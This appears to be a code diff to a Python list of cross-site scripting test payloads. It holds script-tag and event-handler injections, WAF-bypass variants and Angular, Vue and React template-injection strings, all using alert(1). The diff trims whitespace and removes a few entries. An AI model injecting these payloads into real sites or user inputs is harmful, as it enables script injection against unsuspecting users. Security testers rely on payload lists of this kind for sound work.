@@ -6,40 +6,37 @@ XSS_PAYLOADS = [
     '<script>alert(1)</script>',
     '"><script>alert(1)</script>',
     "javascript:alert(1)",
-    
+
     # Event handlers
     '<img src=x onerror=alert(1)>',
     '<svg onload=alert(1)>',
     '<body onload=alert(1)>',
-    '<input autofocus onfocus=alert(1)>',
-    '<details open ontoggle=alert(1)>',
-    '<select autofocus onfocus=alert(1)>',
-    
+
     # WAF bypass - mixed case
     '<ScRiPt>alert(1)</sCrIpT>',
     '<IMG SRC=x onerror=alert(1)>',
-    
+
     # WAF bypass - encoded
     '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
     '%3Cscript%3Ealert(1)%3C/script%3E',
-    
+
     # WAF bypass - polyglots
     '"><svg/onload=alert(1)>',
     "'-alert(1)-'",
     '";alert(1)//',
-    
+
     # WAF bypass - unicode variants
     '<script\\x20>alert(1)</script>',
     '<scrscriptipt>alert(1)</scrscriptipt>',
-    
+
     # DOM-based
     '<a href="javascript:alert(1)">click</a>',
     '<iframe src="javascript:alert(1)">',
-    
+
     # Angular
     '{{constructor.constructor("alert(1)")()}}',
     '${constructor.constructor("alert(1)")()}',
-    
+
     # React
     '{"props":{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}}',
 ]
@@ -57,7 +54,7 @@ FRAMEWORK_XSS_PAYLOADS = {
     ],
     "vue": [
         '{{constructor.constructor("alert(1)")()}}',
-        '{{{_safe}}}\\'',
+        '{{{_safe}}}',
     ],
     "jquery": [
         '<img src=x onerror=alert(1)>',
